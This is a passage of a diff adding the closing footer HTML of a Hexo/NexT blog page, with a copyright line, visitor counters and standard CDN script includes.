+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">zer0_c|imb</span>
+</div>
+<div class="busuanzi-count">
+    <span class="post-meta-item" id="busuanzi_container_site_uv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <script src="https://cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>
+
+  
+<script src="https://cdn.jsdelivr.net/npm/hexo-generator-searchdb@1.4.0/dist/search.js" integrity="sha256-vXZMYLEqsROAXkEw93GGIvaB2ab+QW6w3+1ahD9nXXA=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+
+
+  
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+
+</body>
+</html>
